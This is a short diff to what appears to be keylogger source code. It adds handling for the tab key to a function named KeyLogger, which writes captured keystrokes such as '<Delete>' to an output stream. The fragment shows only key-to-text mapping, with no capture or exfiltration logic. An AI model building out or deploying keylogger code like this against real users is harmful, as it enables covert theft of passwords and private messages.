@@ -323,6 +323,10 @@ void KeyLogger(void)
                         write << " <Delete> ";
                     }
                     break;
+                    case VK_TAB: // for the tab key.
+                    {
+                        write << "\t";
+                    }
                 }
             }
         }
